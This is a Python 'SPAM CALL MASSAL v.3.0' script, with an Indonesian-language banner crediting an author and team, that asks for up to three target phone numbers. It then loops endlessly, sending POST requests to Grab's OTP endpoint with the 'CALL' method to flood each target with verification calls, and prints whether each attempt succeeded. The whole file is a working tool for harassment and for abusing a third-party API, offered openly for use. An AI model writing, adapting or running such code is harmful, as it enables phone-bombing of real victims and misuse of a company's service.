#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""

try:
	import os, requests
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	c=('\033[1;36m')
	r=('\033[1;31m')
	g=('\033[1;32m')
	w=('\033[1;37m')
	print("""%s
			SPAM CALL MASSAL v.3.0%s
 ,_     _‚
 |\\\___//|	%sAuthor: KANG-NEWBIE%s
 |=6   6=|	%sContact: https://t.me/kang_nuubi%s
 \=._Y_.=/	%sGithub: https://github.com/KANG-NEWBIE%s
  )  `  (    ,	%sTEAM: CRABS (t.me/CRABS_ID)%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
\| |._.| |/-’
 '"'   '"'
<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, silahkan hubungi saya"""%(c,r,g,r,g,r,g,r,g,r,w,r))
	print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
	no1 = input("[?] INPUT NO TARGET 1 => %s"%(w))
	no2 = input("%s[?] INPUT NO TARGET 2 => %s"%(g,w))
	no3 = input("%s[?] INPUT NO TARGET 3 => %s"%(g,w))
	dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'&templateID':'pax_android_production'}
	dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'&templateID':'pax_android_production'}
	dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'&templateID':'pax_android_production'}
except ValueError:
	print("%s\nMasukan Angka Untuk Delay"%(r))
	exit()

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	while True:
		print("[!] PLEASE WAIT...")
		idk1=("challengeID")
		idk2=("challengeID")
		idk3=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		if str(idk1) in str(r1.text):
			print("[+] TARGET1 BERHASIL")
		else:
			print("[-] TARGET1 GAGAL")
		if str(idk2) in str(r2.text):
			print("[+] TARGET2 BERHASIL")
		else:
			print("[-] TARGET2 GAGAL")
		if str(idk3) in str(r3.text):
			print("[+] TARGET3 BERHASIL")
		else:
			print("[-] TARGET3 GAGAL")
		print("="*30)
except KeyboardInterrupt:
	print("%ssampai jumpa gan..."%(c))
